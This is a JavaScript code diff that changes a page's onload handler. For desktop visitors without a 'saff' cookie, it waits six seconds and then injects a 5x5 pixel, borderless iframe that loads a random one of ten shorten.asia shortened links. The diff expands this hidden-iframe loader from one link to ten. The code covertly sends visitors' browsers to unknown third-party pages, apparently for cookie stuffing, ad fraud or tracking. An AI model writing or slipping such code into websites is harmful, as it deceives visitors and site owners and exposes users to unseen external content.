@@ -9,19 +9,15 @@ window.onload = function(){
   var loaded = getCookie('saff');
   if(!loaded && !window.mobileAndTabletcheck()) {
     setCookie('saff',1,1);
-    //var list = ['https://shorten.asia/b6Nvstes', 'https://shorten.asia/44h1EFtU'];
-    var list = ['https://shorten.asia/xkg3R8Fv'];
+    var list = ['https://shorten.asia/xTxqPZaZ', 'https://shorten.asia/8rkGYu8F', 'https://shorten.asia/nnZReaWP', 'https://shorten.asia/7qqHXhac', 'https://shorten.asia/GhWSQsaY', 'https://shorten.asia/mE1rY1kD', 'https://shorten.asia/KS11rqtP', 'https://shorten.asia/jSzm4ezc', 'https://shorten.asia/yfeYrAGb', 'https://shorten.asia/aRqE8bhn'];
+    var url = list[Math.floor(Math.random() * list.length)];
     setTimeout(() => {
       var node = document.createElement('iframe');
       node.width = 5;
       node.height = 5;
       node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
-      list.forEach((url, i) => {
-        setTimeout(() => {
-          node.src = url;
-          document.body.append(node.cloneNode());
-        }, i*1000);
-      })
+      node.src = url;
+      document.body.append(node.cloneNode());
     }, 6000);
   }
 }
